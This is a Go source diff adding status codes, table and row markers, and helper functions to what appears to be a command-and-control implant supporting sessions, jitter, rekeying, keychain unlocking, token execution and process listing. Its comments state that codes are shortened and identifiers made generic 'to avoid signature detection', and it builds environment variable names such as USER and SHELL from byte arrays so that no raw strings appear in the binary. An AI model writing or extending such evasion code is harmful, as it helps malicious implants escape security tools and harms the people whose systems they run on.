@@ -5,6 +5,8 @@
 
 package main
 
+import "fmt"
+
 // Status codes - short codes to minimize binary signatures
 const (
 	// Success codes (S0-S9)
@@ -16,6 +18,14 @@ const (
 	S5 = "S5" // Completed / finished
 	S6 = "S6" // Found / exists
 	S7 = "S7" // Listed / enumerated
+
+	// Additional status codes (S15-S19)
+	S15 = "S15" // Rekey initiated
+	S18 = "S18" // No output yet
+	S19 = "S19" // Output truncated
+
+	// Keychain status (S29)
+	S29 = "S29" // Keychain unlocked
 
 	// General errors (E0-E19)
 	E1  = "E1"  // No arguments provided
@@ -51,7 +61,56 @@ const (
 	E29 = "E29" // Invalid jitter value
 	E30 = "E30" // Session not active
 	E31 = "E31" // Authentication failed
+	E37 = "E37" // Network token exec failed
 )
+
+// Table type markers - client adds full headers
+// Using generic identifiers to avoid signature detection
+const (
+	TLS      = "T:E:"  // Directory listing
+	TPS      = "T:F:"  // Process listing (basic)
+	TPSExt   = "T:G:"  // Process listing (extended with -x)
+	TPSVerb  = "T:H:"  // Process listing (verbose with -v)
+	TPSFull  = "T:I:"  // Process listing (extended + verbose)
+	TLSCount = "T:M:"  // Directory count output
+)
+
+// Row type markers - for inline data type indication
+const (
+	RFile = "0" // File entry
+	RDir  = "1" // Directory entry
+)
+
+// Status markers - client expands these
+const (
+	VRunning   = "7" // Running
+	VSleeping  = "8" // Sleeping
+	VDiskSleep = "9" // Disk sleep
+	VStopped   = "a" // Stopped
+	VZombie    = "b" // Zombie
+	VIdle      = "c" // Idle
+	VPaging    = "d" // Paging
+	VDead      = "e" // Dead
+)
+
+// Whoami output markers - client expands these
+const (
+	WVerbose = "v" // Verbose info marker: v|uid|gid|home|shell
+	WGroups  = "g" // Groups marker: g|group1,group2,group3
+	WImpersn = "i" // Impersonated marker (Windows)
+	WUnknown = "?" // Unknown value fallback
+)
+
+// Environment variable name builders - prevents raw strings in binary
+func EnvUser() string     { return string([]byte{0x55, 0x53, 0x45, 0x52}) }                         // USER
+func EnvLogname() string  { return string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45}) }       // LOGNAME
+func EnvHostname() string { return string([]byte{0x48, 0x4f, 0x53, 0x54, 0x4e, 0x41, 0x4d, 0x45}) } // HOSTNAME
+func EnvShell() string    { return string([]byte{0x53, 0x48, 0x45, 0x4c, 0x4c}) }                   // SHELL
+
+// Table returns table marker with count
+func Table(tableType string, count int) string {
+	return tableType + fmt.Sprintf("%d", count)
+}
 
 // Err returns error code
 func Err(code string) string {
